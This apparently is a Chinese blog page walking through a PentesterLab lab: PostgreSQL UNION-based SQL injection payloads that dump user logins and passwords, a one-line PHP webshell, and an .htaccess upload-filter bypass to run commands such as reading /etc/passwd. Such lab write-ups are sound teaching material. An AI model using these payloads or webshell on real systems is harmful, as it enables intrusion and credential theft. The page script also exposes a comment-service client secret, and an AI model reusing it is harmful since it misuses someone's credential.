@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>From SQL Injection to Shell: PostgreSQL edition | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="Pentesterlab">
+    <meta name="description" content="SQL注入检测检测方法已经在“From SQL Injection to Shell”中详细描述过。唯一的区别是错误信息： 1Warning: pg_exec(): Query failed: ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="From SQL Injection to Shell: PostgreSQL edition">
+<meta property="og:url" content="https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="SQL注入检测检测方法已经在“From SQL Injection to Shell”中详细描述过。唯一的区别是错误信息： 1Warning: pg_exec(): Query failed: ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat">
+<meta property="article:published_time" content="2015-04-09T05:18:44.000Z">
+<meta property="article:modified_time" content="2019-09-19T05:21:12.442Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="Pentesterlab">
+<meta name="twitter:card" content="summary">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">From SQL Injection to Shell: PostgreSQL edition</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">From SQL Injection to Shell: PostgreSQL edition</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2015-04-09T05:18:44.000Z" itemprop="datePublished" class="page-time">
+  2015-04-09
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入检测"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入检测</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入利用"><span class="post-toc-number">2.</span> <span class="post-toc-text">SQL注入利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在PostgreSQL中使用UNION进行SQL注入"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">在PostgreSQL中使用UNION进行SQL注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#检索信息"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">检索信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#破解密码"><span class="post-toc-number">3.</span> <span class="post-toc-text">破解密码</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#上传webshell并且执行代码"><span class="post-toc-number">4.</span> <span class="post-toc-text">上传webshell并且执行代码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#传统的webshell"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">传统的webshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#htaccess介绍"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">.htaccess介绍</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#获得代码执行"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">获得代码执行</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-From-SQL-Injection-to-Shell-PostgreSQL-edition"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">From SQL Injection to Shell: PostgreSQL edition</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2015-04-09 13:18:44" datetime="2015-04-09T05:18:44.000Z"  itemprop="datePublished">2015-04-09</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="SQL注入检测"><a href="#SQL注入检测" class="headerlink" title="SQL注入检测"></a>SQL注入检测</h1><p>检测方法已经在“From SQL Injection to Shell”中详细描述过。唯一的区别是错误信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: pg_exec(): Query failed: ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat&#x3D;2&#39; ^ in &#x2F;var&#x2F;www&#x2F;classes&#x2F;picture.php on line 17 ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat&#x3D;2&#39; ^</span><br></pre></td></tr></table></figure>
+
+<p>SQL注入并不是一门精确的科学，很多东西都会影响到你的测试结果。如果你遇到这些，继续测试注入，尝试测试出后台代码来确认它是一个SQL注入。</p>
+<p>为了找到SQL注入，你需要访问网站并且使用这些方法测试每一个页面的每一个参数。一旦你发现了SQL注入，你可以到下一节去学习如何利用它。</p>
+<h1 id="SQL注入利用"><a href="#SQL注入利用" class="headerlink" title="SQL注入利用"></a>SQL注入利用</h1><p>现在我们在页面<a href="http://vulnerable/cat.php" target="_blank" rel="noopener">http://vulnerable/cat.php</a>发现了一个SQL注入，为了更进一步，我们需要利用它来检索信息。为此，我们需要了解SQL中使用的 UNION 关键字。</p>
+<h2 id="在PostgreSQL中使用UNION进行SQL注入"><a href="#在PostgreSQL中使用UNION进行SQL注入" class="headerlink" title="在PostgreSQL中使用UNION进行SQL注入"></a>在PostgreSQL中使用UNION进行SQL注入</h2><p>类似于MySQL，使用UNION利用SQL注入遵循下面的步骤：</p>
+<ol>
+<li>找出列数用来执行UNION  </li>
+<li>找出哪些列被显示在页面上  </li>
+<li>从元表数据库中检索信息  </li>
+<li>从其他表或数据库中检索信息  </li>
+</ol>
+<p>为了执行SQL注入的请求，你需要找到所查询的第一部分返回的列数。你需要猜这个数，除非你有应用程序的源代码。  </p>
+<p>有两种方法得到这个信息：  </p>
+<ul>
+<li>使用 <strong>UNION SELECT</strong> 和增加列数；  </li>
+<li>使用 <strong>ORDER BY</strong> 语句。  </li>
+</ul>
+<p>如果你尝试 <strong>UNION</strong> 并且两个查询返回的列数是不同的，数据库将抛出一个错误：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: pg_exec(): Query failed: ERROR: each UNION query must have the same number of columns</span><br></pre></td></tr></table></figure>
+
+<p>可以使用这个属性来猜列数。例如，如果你可以注入以下语句： <strong>SELECT id,name,price FROM articles where id=1</strong> ，你可以采用以下步骤：  </p>
+<ul>
+<li><strong>SELECT id,name,price FROM articles where id=1 UNION SELECT 1</strong> ,注入内容 <strong>1 UNION SELECT 1</strong> 将返回一个错误因为查询语句的两个子部分的列数是不同的；  </li>
+<li><strong>SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2</strong> ，因为如上同样的原因，注入内容 <strong>1 UNION SELECT 1,2</strong> 会返回一个错误；  </li>
+<li><strong>SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3</strong> ，因为两个子部分拥有相同的列数，这个语句将抛出一个不同的错误信息。</li>
+</ul>
+<p>如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: pg_exec(): Query failed: ERROR: UNION types character varying and integer cannot be matched</span><br></pre></td></tr></table></figure>
+
+<p>另一种方法是利用关键字 <strong>ORDER BY</strong> 。类似于“From SQL Injection to Shell”中的使用方式。唯一的区别是由应用程序返回的错误消息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: pg_exec(): Query failed: ERROR: ORDER BY position 10 is not in select list</span><br></pre></td></tr></table></figure>
+
+<h2 id="检索信息"><a href="#检索信息" class="headerlink" title="检索信息"></a>检索信息</h2><p>现在我们已经知道了列数，我们可以从数据库中检索信息。基于我们收到的错误信息，我们知道后台使用的数据库是 PostgreSQL 。</p>
+<p>相比于MySQL，PostgreSQL多需要一步使得到的 <strong>UNION</strong> 语句正常工作：列需要的两个查询必须是由第一个查询决定类型之间的同类型。如果我们使用之前发现的语句 <strong>1 UNION SELECT 1,2,3,4</strong> ，可以看到下面的错误信息显示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: pg_exec(): Query failed: ERROR: UNION types character varying and integer cannot be matched</span><br></pre></td></tr></table></figure>
+
+<p>为了避免这个错误，我们可以用 <strong>null,null,null,null</strong> 来代替 <strong>1,2,3,4</strong> ，不会产生任何错误。现在我们可以找出哪些列是一个字符串（因为大多数的我们想要的信息将基于字符串并且很容易转换任何值为字符串）。要做到这一点，我们只需要尝试每一列一个接一个相互，看看哪一个不返回一个错误：</p>
+<ul>
+<li><strong>1 UNION SELECT &#39;aaaa&#39;,null,null,null</strong> ：该测试返回消息：<strong>invalid input syntax for integer</strong> ，这可能是一个整数列。  </li>
+<li><strong>1 UNION SELECT null,&#39;aaaa&#39;,null,null</strong> ：不返回一个错误，我们可以使用这一列，我们可以在页面中看到字符串 <strong>aaaa</strong>。  </li>
+<li><strong>1 union select null,null,&#39;aaaa&#39;,null</strong> ：不返回一个错误，我们可以用这一列，结果是不可见的在网页中，在页面的源中可见（在 <strong>&lt;img</strong> 标签中）。  </li>
+<li><strong>1 union select null,null,null,&#39;aaaa&#39;</strong> ：该测试返回消息：<strong>invalid input syntax for integer</strong> ，这可能是一个整数列。</li>
+</ul>
+<p>利用这些信息，我们可以迫使数据库执行一个函数或给我们发送信息：</p>
+<ul>
+<li>用PHP应用程序连接到数据库的用户使用 <strong>current_user</strong>  </li>
+<li>数据库版本使用 <strong>version()</strong></li>
+</ul>
+<p>例如你可以访问以下URL获取这些信息：</p>
+<ul>
+<li>数据库版本：<strong><a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,version(),null,null" target="_blank" rel="noopener">http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,version(),null,null</a></strong>  </li>
+<li>当前用户：<strong><a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_user,null,null" target="_blank" rel="noopener">http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_user,null,null</a></strong>  </li>
+<li>当前数据库：<strong><a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_database(),null,null" target="_blank" rel="noopener">http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_database(),null,null</a></strong>  </li>
+</ul>
+<p>我们现在能够从数据库中检索信息和检索任意内容。为了获取当前应用程序相关的信息，我们需要：</p>
+<ul>
+<li>当前数据库中的所有表的名称  </li>
+<li>我们要从中检索信息的表的列名  </li>
+<li>PostgreSQL提供了包含有关数据库、表、列的元信息表。我们将使用这些表来获取我们需要的信息来构造最终请求。</li>
+</ul>
+<p>以下查询可用于检索：</p>
+<ul>
+<li>所有表的列表：<strong>SELECT tablename FROM pg_tables</strong>  </li>
+<li>所有列的列表：<strong>SELECT column_name FROM information_schema.columns</strong></li>
+</ul>
+<p>通过混合这些查询和以前的URL，你能猜出信息检索的访问链接：</p>
+<ul>
+<li>表的列表：<strong>1 UNION SELECT null,tablename,null,null FROM pg_tables</strong>  </li>
+<li>列的列表：<strong>1 UNION SELECT null,column_name,null,null FROM information_schema.columns</strong></li>
+</ul>
+<p>问题是，这些请求，为您提供一个所有的表和列的原列表，但查询数据库和检索感兴趣的信息，你需要知道什么列是属于什么表。幸好，information_schema.columns stores表中存储有表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name,column_name <span class="keyword">FROM</span> information_schema.columns</span><br></pre></td></tr></table></figure>
+
+<p>要获取这些信息，我们可以：</p>
+<ul>
+<li>把表名和列名放在不同的注入位置：<strong>1 UNION SELECT null, table_name, column_name,null,null FROM information_schema.columns</strong>  </li>
+<li>把表名和列名放在同一个注入位置，使用级联符号（<strong>||</strong>）分隔：<strong>1 UNION SELECT null,table_name||&#39;:&#39;|| column_name,null,null FROM information_schema.columns</strong> 。<strong>：</strong>可以很容易的分割查询结果。</li>
+</ul>
+<p>利用这些信息，你现在可以创建一个查询，从表中检索信息：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION <span class="keyword">SELECT</span> <span class="literal">null</span>,login||<span class="string">':'</span>||<span class="keyword">password</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">FROM</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后获取用户名和密码用来访问管理页面。</p>
+<p>该SQL注入提供和访问数据库连接的应用程序使用用户相同的权限(current_user)…这就是为什么当你在部署WEB应用的时候尽可能给它的用户最低权限。</p>
+<h1 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h1><p>使用在”<strong>From SQLInjection to Shell</strong>“中描述的方法可以很容易破解密码。</p>
+<h1 id="上传webshell并且执行代码"><a href="#上传webshell并且执行代码" class="headerlink" title="上传webshell并且执行代码"></a>上传webshell并且执行代码</h1><h2 id="传统的webshell"><a href="#传统的webshell" class="headerlink" title="传统的webshell"></a>传统的webshell</h2><p>一旦进入管理页面，下一个目标是找到一种方法，在操作系统上执行命令。</p>
+<p>我们可以看到，有一个文件上传功能允许用户上传图片，我们可以利用这个功能来上传一个PHP脚本。这个PHP脚本一旦上传到服务器将给我们一种方式来运行PHP代码和命令。</p>
+<p>首先我们需要创建一个PHP脚本来运行命令。下面是一个简单的和最小的webshell的源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  system($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个脚本获取参数cmd的内容并且执行它。它需要被保存为一个<strong>.php</strong>扩展名的文件，例如<strong>shell.php</strong>可以被用作文件名。</p>
+<p>我们现在可以使用在网页的上传功能：<a href="http://vulnerable/admin/new.php" target="_blank" rel="noopener">http://vulnerable/admin/new.php</a>尝试上传这个脚本。</p>
+<p>我们可以看到，脚本没有被正确上传到服务器上。应用阻止文件扩展名<strong>.php</strong>上传。我们可以尝试<strong>.php3</strong>，<strong>.php.test</strong>……不幸的是这些名字都不工作。</p>
+<p>我们需要找到另一种方式来获得命令的执行。</p>
+<h2 id="htaccess介绍"><a href="#htaccess介绍" class="headerlink" title=".htaccess介绍"></a><strong>.htaccess</strong>介绍</h2><p><strong>.htaccess</strong>是用来执行每次修改Apache配置。他们可以是非常危险的如果你可以上传一个并且得到由服务器解释。</p>
+<p>获取命令执行的最常见的方式是有一个任意的扩展处理程序：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .blah</span><br></pre></td></tr></table></figure>
+
+<p>这一行将告诉Apache的解释<strong>.blan</strong>文件使用PHP引擎。因为<strong>.blan</strong>文件看起来不像被应用程序过滤。</p>
+<p>这个工作了因为 AllowOverride被设置为All（它的默认值），这意味着如果服务器遇到<code>.htaccess</code>文件将解释它。</p>
+<p>一旦我们上传了包含以上内容的<strong>.htaccess</strong>文件。我们现在可以重命名文件 <strong>shell.php</strong> 到 <strong>shell.blan</strong> 然后上传它。</p>
+<p>一旦这两个文件上传，我们可以得到命令的执行</p>
+<h2 id="获得代码执行"><a href="#获得代码执行" class="headerlink" title="获得代码执行"></a>获得代码执行</h2><p>现在，我们需要找到我们的脚本，管理上传放在Web服务器上的文件。我们需要确保该文件是直接可用的Web客户端。我们可以参观新上传的图像的网页，看到 <strong>img</strong> 标记指向：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">       &lt;h2 class&#x3D;&quot;title&quot;&gt;Last picture: Test shell&lt;&#x2F;h2&gt;</span><br><span class="line">       </span><br><span class="line">       &lt;div class&#x3D;&quot;inner&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">         &lt;p&gt;</span><br><span class="line">           &lt;img src&#x3D;&quot;admin&#x2F;uploads&#x2F;shell.blah&quot; alt&#x3D;&quot;Test shell&quot; &#x2F;&gt;          </span><br><span class="line">         &lt;&#x2F;p&gt;</span><br><span class="line">       &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>你现在可以访问页面在以下地址并且运行命令使用cmd参数。例如：访问<a href="http://vulnerable/admin/uploads/shell.blah?cmd=uname" target="_blank" rel="noopener">http://vulnerable/admin/uploads/shell.blah?cmd=uname</a>将运行命令 <strong>uname</strong> 在操作系统上并且返回当前系统内核（<strong>Linux</strong>）。</p>
+<p>其他命令可以用来获取更多信息：</p>
+<ul>
+<li><strong>cat /etc/passwd</strong> 来获得系统的完整的用户列表；  </li>
+<li><strong>uname -a</strong> 来获得当前内核版本；  </li>
+<li><strong>ls</strong> 来获得当前目录内容；  </li>
+<li>…</li>
+</ul>
+<p>像以前一样，我们的webshell具有和Web服务器上运行PHP脚本相同的权限，例如你不可以检索文件 <strong>/etc/shadow</strong> 的内容因为Web服务器没有访问此文件的权限（但你还是应尽可能尝试假设管理员错误地修改了权限）。</p>
+<p>每个命令都是运行在一个全新的上下文独立的前面的命令，你将无法通过运行 <strong>cd /etc</strong> 和 <strong>ls</strong> 得到 <strong>/etc/</strong> 目录的内容，因为第二命令将在一个新的上下文。获取目录 <strong>/etc/</strong> 内容，您将需要运行<strong>ls /etc/</strong>。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次练习教你如何手动检测和利用SQL注入<br>PostgreSQL数据库访问到管理页面。一旦在“信任区”，更多的功能通常是可用的，将可能会导致更多的漏洞。这是基于一个几年前一个网站进行渗透测试的结果，但这类漏洞的网站今天仍在互联网存在。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-09-19T05:21:12.442Z" itemprop="dateUpdated">2019-09-19 13:21:12</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentesterlab/" rel="tag">Pentesterlab</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/&title=《From SQL Injection to Shell: PostgreSQL edition》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/&title=《From SQL Injection to Shell: PostgreSQL edition》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《From SQL Injection to Shell: PostgreSQL edition》 — 喵喵喵喵&url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2015/09/13/CVE-2014-6271-Shellshock/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">CVE-2014-6271/Shellshock</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2015/03/26/PHP-Include-And-Post-Exploitation/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">PHP Include And Post Exploitation</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/&title=《From SQL Injection to Shell: PostgreSQL edition》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
